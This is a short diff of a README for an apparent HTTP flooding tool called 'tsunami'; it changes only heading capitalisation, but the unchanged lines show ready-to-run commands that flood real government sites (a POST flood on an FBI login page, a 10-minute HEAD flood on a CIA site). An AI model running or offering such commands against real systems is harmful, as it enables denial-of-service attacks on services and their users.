@@ -27,11 +27,11 @@ go build
 ```
 
 ## Examples
-### Low volume POST flood lasting forever
+### Low Volume POST Flood Lasting Forever
 ```bash
 ./tsunami -w 2 "https://fbi.gov/login" POST "username=Ammar&password=g1thuB123"
 ```
-### High volume HEAD flood lasting for 10 minutes
+### High Volume HEAD Flood Lasting For 10 Minutes
 ```bash
 ./tsunami -w 100 -s 600 "https://cia.gov/" HEAD
 ```
